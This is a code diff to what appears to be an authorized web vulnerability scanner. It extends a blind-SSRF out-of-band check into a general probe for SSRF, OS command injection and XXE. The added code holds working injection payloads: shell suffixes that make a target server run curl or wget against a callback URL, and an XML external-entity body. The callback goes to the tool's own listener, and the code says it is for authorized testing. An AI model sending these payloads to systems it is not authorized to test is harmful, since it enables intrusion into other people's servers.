@@ -396,10 +396,13 @@ def _http_post(url: str, data=None, json_body=None, timeout: int = 8, headers: d
                          headers=headers or None)
 
 
-def _http_write(method: str, url: str, json_body=None, timeout: int = 8, headers: dict = None):
-    """PUT/PATCH/DELETE seam for the opt-in write-BOLA oracle (patchable in tests)."""
+def _http_write(method: str, url: str, json_body=None, timeout: int = 8, headers: dict = None, data=None):
+    """PUT/PATCH/DELETE/POST seam for write-BOLA + OAST XXE (patchable in tests). `data` = raw body
+    (e.g. an XML entity payload); `json_body` = a JSON dict. Use one or the other."""
     import requests
     _rate_gate(url)
+    if data is not None:
+        return requests.request(method.upper(), url, data=data, timeout=timeout, headers=headers or None)
     return requests.request(method.upper(), url, json=json_body, timeout=timeout,
                             headers=headers or None)
 
@@ -3853,16 +3856,27 @@ Report:"""
                 "message": f"Secrets/exposure: {len(findings)} finding(s), {len(endpoints)} JS-baked endpoint(s).",
                 "data": {"findings": findings, "endpoints": sorted(endpoints)[:100]}}
 
-    def oast_ssrf(self, url: str, param: str = "url", wait: float = 3.0, listener=None) -> dict:
-        """v1.3 A5 — OAST/OOB confirmation for BLIND SSRF. Mints a callback URL (correlation id), injects
-        it into `param`, sends the request, then polls the listener: an out-of-band hit = the server made
-        the request server-side = CONFIRMED blind SSRF (candidate->confirmed; reflection can't produce an
-        OOB call). Opt-in + local-first: spins a local HTTP listener by default (injectable for a self-
-        hosted/interactsh one). Authorized targets only."""
+    # class -> (finding template, human name). Same OOB listener; only the injection differs.
+    _OAST_KINDS = {
+        "ssrf": ("ssrf-oob-confirmed", "server-side request forgery"),
+        "cmdi": ("cmdi-oob-confirmed", "OS command injection (blind)"),
+        "xxe":  ("xxe-oob-confirmed", "XML external entity (blind)"),
+    }
+
+    def oast_probe(self, url: str, param: str = "url", kind: str = "ssrf",
+                   wait: float = 3.0, listener=None) -> dict:
+        """v1.3 A5 — OAST/OOB confirmation for BLIND classes. Mint a callback (correlation id), inject it
+        into the class-appropriate payload, poll the listener: an out-of-band hit = the server reached out
+        = CONFIRMED (reflection can't produce an OOB call). `kind`: ssrf (param=callback URL) · cmdi (shell
+        OOB payloads into param) · xxe (external-entity XML body). blind-SQLi OOB is DB-specific + needs a
+        DNS listener — deferred (see V1_3_OAST_DESIGN.md). Opt-in + local-first. Authorized targets only."""
         import time
         import uuid
         from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
         from core import oast
+        if kind not in self._OAST_KINDS:
+            return {"success": False, "message": f"OAST kind must be one of {list(self._OAST_KINDS)}.", "data": {}}
+        template, human = self._OAST_KINDS[kind]
         own = listener is None
         L = (listener or oast.LocalHTTPListener().start())
         try:
@@ -3870,41 +3884,67 @@ Report:"""
             cb = L.mint(cid)
             parts = urlsplit(url)
             qs = dict(parse_qsl(parts.query))
-            qs[param] = cb
-            purl = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(qs), ""))
-            try:
-                _http_get(purl)
-            except Exception:
-                pass
+            target_desc = url
+            if kind == "ssrf":
+                qs[param] = cb
+                purl = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(qs), ""))
+                target_desc = f"param '{param}'"
+                try:
+                    _http_get(purl)
+                except Exception:
+                    pass
+            elif kind == "cmdi":
+                base = qs.get(param, "1")
+                for suf in (f";curl -s {cb};", f"|curl -s {cb}", f"$(curl -s {cb})",
+                            f"`curl -s {cb}`", f"&curl -s {cb}&", f";wget -q -O- {cb};"):
+                    q = dict(qs); q[param] = base + suf
+                    try:
+                        _http_get(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), "")))
+                    except Exception:
+                        pass
+                    if L.poll(cid):
+                        break
+                target_desc = f"param '{param}' (shell OOB)"
+            elif kind == "xxe":
+                body = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY oob SYSTEM "{cb}">]><r>&oob;</r>')
+                try:
+                    _http_write("POST", url, data=body, headers={"Content-Type": "application/xml"})
+                except Exception:
+                    pass
+                target_desc = "XML external-entity body"
             deadline = time.time() + max(0.5, wait)
-            hits = []
+            hits = L.poll(cid)
             while time.time() < deadline and not hits:
+                time.sleep(0.2)
                 hits = L.poll(cid)
-                if not hits:
-                    time.sleep(0.2)
             if hits:
                 h = hits[0]
                 finding = {
-                    "template": "ssrf-oob-confirmed", "severity": "high", "url": purl, "cve": None,
-                    "validated": True,
-                    "evidence": (f"Blind SSRF CONFIRMED via OAST: injected callback {cb} into param '{param}'; the "
+                    "template": template, "severity": "high" if kind != "cmdi" else "critical",
+                    "url": url, "cve": None, "validated": True,
+                    "evidence": (f"Blind {human} CONFIRMED via OAST: injected callback {cb} ({target_desc}); the "
                                  f"server made an out-of-band {h['proto'].upper()} request to the listener "
-                                 f"(source {h['src_ip']}, {h['timestamp']}, correlation-id {cid}) — an OOB call that "
-                                 f"reflection cannot produce, proving server-side request forgery."),
+                                 f"(source {h['src_ip']}, {h['timestamp']}, correlation-id {cid}) — an OOB call "
+                                 f"reflection cannot produce."),
                     "response": f"OOB hit: {h['method']} {h['path']} from {h['src_ip']} ({h['proto']}) at {h['timestamp']}",
-                    "repro": [f"Mint an OAST callback URL (correlation-id {cid})", f"Set {param}={cb}",
-                              f"Send GET {purl}", "Observe the out-of-band callback on the listener"],
+                    "repro": [f"Mint an OAST callback (correlation-id {cid})",
+                              f"Inject {cb} via {target_desc}", f"Send the request to {url}",
+                              "Observe the out-of-band callback on the listener"],
                     "oob": h,
                 }
-                return {"success": True, "message": f"SSRF OOB CONFIRMED at {url} (param '{param}').",
+                return {"success": True, "message": f"{kind.upper()} OOB CONFIRMED at {url}.",
                         "data": {"findings": [finding], "oob": h}}
             return {"success": True,
-                    "message": (f"No OOB callback from {url} (param '{param}') within {wait}s — not confirmed "
-                                f"(not vulnerable, egress-filtered, or wrong param)."),
+                    "message": (f"No OOB callback for {kind} at {url} within {wait}s — not confirmed "
+                                f"(not vulnerable, egress-filtered, or wrong injection point)."),
                     "data": {"findings": []}}
         finally:
             if own:
                 L.stop()
+
+    def oast_ssrf(self, url: str, param: str = "url", wait: float = 3.0, listener=None) -> dict:
+        """Thin wrapper: blind-SSRF OOB confirmation (see oast_probe)."""
+        return self.oast_probe(url, param=param, kind="ssrf", wait=wait, listener=listener)
 
     def graphql_hunt(self, url: str, as_user: str = "") -> dict:
         """Hunt a GraphQL endpoint (Tier-2): introspection (schema exposure = info disclosure),
